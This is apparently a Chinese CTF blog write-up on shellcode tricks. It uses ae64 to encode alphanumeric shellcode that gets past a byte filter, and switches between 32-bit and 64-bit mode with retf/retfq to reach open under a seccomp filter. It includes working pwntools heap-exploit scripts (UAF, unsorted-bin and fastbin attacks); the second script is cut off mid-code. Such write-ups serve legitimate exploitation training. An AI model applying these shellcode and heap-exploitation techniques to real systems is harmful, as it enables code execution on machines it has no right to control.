@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="google-site-verification" content="McULNauwae3fxE8yPK3QNQNAYvG6cZAJ02xx9Lpbc98" />
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/hope.jpg">
+  <link rel="icon" href="/img/hope.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hope">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="shellcode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode技巧">
+<meta property="og:url" content="https://h0pe-ay.github.io/shellcode%E7%9A%84%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="hope">
+<meta property="og:description" content="shellcode">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350605.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350607.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350608.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350609.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350612.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350613.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350614.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350615.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350616.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350617.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350618.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350619.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350620.png">
+<meta property="article:published_time" content="2023-08-12T15:22:19.942Z">
+<meta property="article:author" content="hope">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350600.png">
+  
+  
+  
+  <title>shellcode技巧 - hope</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"h0pe-ay.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZqEEnP8vrF2LzEKjCt8pL5Cf-gzGzoHsz","app_key":"6Owvec9nVB4K93xxi7CKzAqh","server_url":"https://zqeenp8v.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>hope</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="shellcode技巧"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-12 23:22" pubdate>
+          2023年8月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">shellcode技巧</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ASCII码-shellcode"><a href="#ASCII码-shellcode" class="headerlink" title="ASCII码-shellcode"></a>ASCII码-shellcode</h1><p>网上已经有成熟的工具了，所以就简单记录一下工具怎么用吧</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/veritas501/ae64.git">https://github.com/veritas501/ae64.git</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rcx/shellcode_encoder">https://github.com/rcx/shellcode_encoder</a></p>
+<p>结合题目来看吧，没有开启NX保护，基本这类型题目九成九都是shellcode题</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350600.png" srcset="/img/loading.gif" lazyload alt="image-20230812220258102"></p>
+<p>程序一开始会让我们在<code>bss</code>段上输入数据，并且判断输入的字符大小是否小于0x1F，再结合NX保护没开启的操作，很容易可以想到此时输入的就是shellcode，而每个字节的不能小于0x1F，那么使用ASCII码shellcode就可以完全绕过了，因为小于0x1F的都是不可见字符</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350602.png" srcset="/img/loading.gif" lazyload alt="image-20230812220502748"></p>
+<p>接着再来看题目存在的漏洞，题目存在很明显的UAF漏洞</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350603.png" srcset="/img/loading.gif" lazyload alt="image-20230812220758365"></p>
+<p>在选项5中则是留有触发shellcode的条件，只要dword_602440不为0则直接指向我们输入的shellcode，而dword_602440位于bss段，因此默认就为0</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350604.png" srcset="/img/loading.gif" lazyload alt="image-20230812220848343"></p>
+<p>而在add函数中，分配堆块又恰好都在unsortbin的范围内，那么思路很清楚了，就是使用unsortbin修改dword_602440的值，那么就能触发shellcode</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350605.png" srcset="/img/loading.gif" lazyload alt="image-20230812221039170"></p>
+<p>剩下就是shellcode如何绕过0x1F这个限制，可以看到syscal是<code>\xf\x5</code>，因此syscal都无法绕过这个限制</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350606.png" srcset="/img/loading.gif" lazyload alt="image-20230812221435095"></p>
+<p>这里使用ae64这个工具</p>
+<p>首先将需要修改的shellcode以二进制的形式导出，这里直接用pwntools生成的shellcode即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># get bytes format shellcode</span><br>shellcode = asm(shellcraft.sh())<br><br><span class="hljs-comment"># get alphanumeric shellcode</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;wb+&#x27;</span>)<br>f.write(shellcode)<br>f.close()<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350607.png" srcset="/img/loading.gif" lazyload alt="image-20230812222658159"></p>
+<p>接着使用ae64的库直接修改为ASCII码shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>obj = AE64()<br>sc = obj.encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;rdx&#x27;</span>)<br><span class="hljs-built_in">print</span>(sc)<br><br></code></pre></td></tr></table></figure>
+
+<p>这里rdx即为shellcode执行的时候call的寄存器</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350608.png" srcset="/img/loading.gif" lazyload alt="image-20230812223222314"></p>
+<p>然后就可以生成shellcode了</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350609.png" srcset="/img/loading.gif" lazyload alt="image-20230812223247022"></p>
+<p>紧接着拿这段生成的shellcode就可以绕过了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot; choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot; message?&quot;</span>)<br>	sh.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot; choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot;o be deleted?&quot;</span>)<br>	sh.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot; choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot; be modified?&quot;</span>)<br>	sh.sendline(<span class="hljs-built_in">str</span>(index))<br>	sh.recvuntil(<span class="hljs-string">&quot;t of the message?&quot;</span>)<br>	sh.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot; choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot; to be showed?&quot;</span>)<br>	sh.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>	sh.recvuntil(<span class="hljs-string">&quot; choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>payload = <span class="hljs-string">&quot;RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&quot;</span><br>sh.send(payload)<br>add(<span class="hljs-number">0x81</span>)<br>add(<span class="hljs-number">0x81</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x602440</span> - <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x81</span>)<br>exp()<br><br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="机器切换-shellcode"><a href="#机器切换-shellcode" class="headerlink" title="机器切换-shellcode"></a>机器切换-shellcode</h1><p>有时候会遇到题目需要同时使用32位shellcode与64位shellcode，那么如何进行机器切换则成为解题的关键。</p>
+<p>CS寄存器则是用于标记机器位数的关键寄存器</p>
+<ul>
+<li>CS&#x3D;0x33，64位</li>
+<li>CS&#x3D;0x23，32位</li>
+</ul>
+<p>那么如何修改CS寄存器的值，则需要通过retfq与retf的指令</p>
+<ul>
+<li><p>refq，从64位切换到32位</p>
+<ul>
+<li><pre><code class="assembly">push 0x23; #32位的CS寄存器的值
+push 0xxx; #需要跳转的地址
+retfq; #从32位切换到64位
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><br>    <br><br>- ref，从<span class="hljs-number">32</span>位切换至<span class="hljs-number">64</span>位<br><br>  - ```assembly<br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x33</span>; <span class="hljs-meta">#64的CS寄存器的值</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0</span>xxx; <span class="hljs-meta">#需要跳转的地址</span><br>    retf; <span class="hljs-meta">#从64位切换到32位</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p>再以一道题目作为例子，保护如下，还是没有开启NX保护</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350610.png" srcset="/img/loading.gif" lazyload alt="image-20230812224501848"></p>
+<p>题目漏洞在于，再add函数中可申请11个堆块，而题目中给堆块地址容纳的个数为10，因此申请的第11个堆块的地址则会到length中，从而导致第1个堆块的大小变成了堆块的地址值，造成了堆溢出。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350611.png" srcset="/img/loading.gif" lazyload alt="image-20230812224711955"></p>
+<p>这里有个需要注意的地方是会首先检测存放堆块的位置是否为0，为0才会给该堆块申请的机会，因此第1个堆块的大小必须设置为0，才能够申请到11个堆块。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350612.png" srcset="/img/loading.gif" lazyload alt="image-20230812225143067"></p>
+<p>题目还是用mallopt修改了fastbin的大小为0x10，因此使得无法释放的堆块无法放置到fastbin中，但是mallopt实际是修改了max_global_fast的大小</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350613.png" srcset="/img/loading.gif" lazyload alt="image-20230812225341764"></p>
+<p>但是题目存在堆溢出漏洞，因此使用修改Unsortbin的bk指针，修改global_max_fast的即可，这样就可以让堆块放进fastbin中了。</p>
+<p>并且允许在bss段上输入数据，且该地址刚好在存放堆块地址的上方，因此伪造虚假堆块在该位置就可以完成任意地址写了。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350614.png" srcset="/img/loading.gif" lazyload alt="image-20230812225458229"></p>
+<p>紧接着修改free函数的got表地址为堆块地址，就可以跳转到shellcode中执行，可以看到堆块地址也是具有可执行权限的。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350615.png" srcset="/img/loading.gif" lazyload alt="image-20230812225635212"></p>
+<p>查看一下禁用了哪些函数，发现只能用read，write以及fstat函数，但是fstat函数对于这道题来说没有用。那么没有open函数，我们就没办法进行orw的利用了。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350616.png" srcset="/img/loading.gif" lazyload alt="image-20230812225852456"></p>
+<p>可以看到fstat函数的64位的系统调用号为5</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350617.png" srcset="/img/loading.gif" lazyload alt="image-20230812230046268"></p>
+<p>但是32位下的系统调用号5为open函数</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350618.png" srcset="/img/loading.gif" lazyload alt="image-20230812230125078"></p>
+<p>那么如果能切换到32位下执行系统调用为5的系统调用，即可完成open函数的执行，这里就要用到上述的方法使用ref与refq指令完成机器位数的切换。</p>
+<p>这里需要注意两个点</p>
+<p>（1）在切换为机器位数之后栈顶的地址会被截断为4个字节，因此需要重新调整一下栈顶的地址</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350619.png" srcset="/img/loading.gif" lazyload alt="image-20230812230855903"></p>
+<p>（2）在机器位数切换为32位时，在执行系统调用还是会显示原来的函数，但是这个是gdb显示错误，它实际被修改为open函数了</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308122350620.png" srcset="/img/loading.gif" lazyload alt="image-20230812230929182"></p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#sh = process(&quot;./pwn&quot;)</span><br><br>elf = ELF(<span class="hljs-string">&quot;pwn&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name,desc</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot;choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot; name?&quot;</span>)		<br>	sh.send(name)<br>	sh.recvuntil(<span class="hljs-string">&quot;desc?&quot;</span>)<br>	sh.send(desc)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot;choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot; message?&quot;</span>)<br>	sh.send(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot;choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot; be deleted?&quot;</span>)<br>	sh.send(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, offset, content</span>):<br>	sh.recvuntil(<span class="hljs-string">&quot;choice:&quot;</span>)<br>	sh.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>	sh.recvuntil(<span class="hljs-string">&quot;ssage to be modified?&quot;</span>)<br>	sh.send(<span class="hljs-built_in">str</span>(index))<br>	sh.recvuntil(<span class="hljs-string">&quot;message to be modified?&quot;</span>)<br>	sh.send(<span class="hljs-built_in">str</span>(offset))<br>	sh.recvuntil(<span class="hljs-string">&quot;ent of the message?&quot;</span>)<br>	sh.send(content)<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>	<span class="hljs-keyword">try</span>:<br>		sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>		add(<span class="hljs-number">0</span>) <span class="hljs-comment">#0</span><br>		add(<span class="hljs-number">0</span>) <span class="hljs-comment">#1</span><br>		add(<span class="hljs-number">0x60</span>)<br>		<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>			add(<span class="hljs-number">0x71</span>)<br>		delete(<span class="hljs-number">1</span>)<br>		payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0x37f8</span> - <span class="hljs-number">0x10</span>)<br>		edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,payload)<br>		add(<span class="hljs-number">9</span>)<br>		delete(<span class="hljs-number">2</span>)<br>		delete(<span class="hljs-number">3</span>)<br>		delete(<span class="hljs-number">4</span>)<br>		delete(<span class="hljs-number">5</span>)<br>		user(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>),<span class="hljs-string">&#x27;b&#x27;</span>)<br>		target = <span class="hljs-number">0x6020f0</span> <br>		payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(target)<br>		edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,payload)<br>		add(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br>		sh.recvuntil(<span class="hljs-string">&quot;Ptr: &quot;</span>)<br>		addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span>+sh.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>)<br>		log.info(<span class="hljs-string">&quot;addr:&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>		add(<span 